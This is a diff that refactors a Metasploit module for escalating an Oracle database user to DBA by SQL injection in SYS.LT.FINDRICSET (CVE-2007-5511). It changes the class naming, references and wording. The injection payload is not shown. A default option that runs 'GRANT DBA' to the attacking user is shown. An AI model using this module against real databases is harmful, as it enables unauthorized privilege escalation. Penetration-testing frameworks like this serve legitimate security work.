@@ -1,20 +1,17 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method',
       'Description'    => %q{
-          This module will escalate a Oracle DB user to DBA by exploiting
-          an sql injection bug in the SYS.LT.FINDRICSET package via Evil
+          This module will escalate an Oracle DB user to DBA by exploiting
+          a sql injection bug in the SYS.LT.FINDRICSET package via Evil
           Cursor technique. Tested on oracle 10.1.0.3.0 -- should work on
           thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical
           Patch update October 2007.
@@ -26,7 +23,6 @@ class Metasploit3 < Msf::Auxiliary
           [ 'CVE', '2007-5511'],
           [ 'OSVDB', '40079'],
           [ 'BID', '26098' ],
-          [ 'URL', 'http://rawlab.mindcreations.com/codes/exp/oracle/sys-lt-findricsetV2.sql'],
           [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2007.html'],
         ],
       'DisclosureDate' => 'Oct 17 2007'))
@@ -34,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
       register_options(
         [
           OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-        ], self.class)
+        ])
   end
 
   def run
@@ -59,5 +55,4 @@ EOF
       return
     end
   end
-
 end
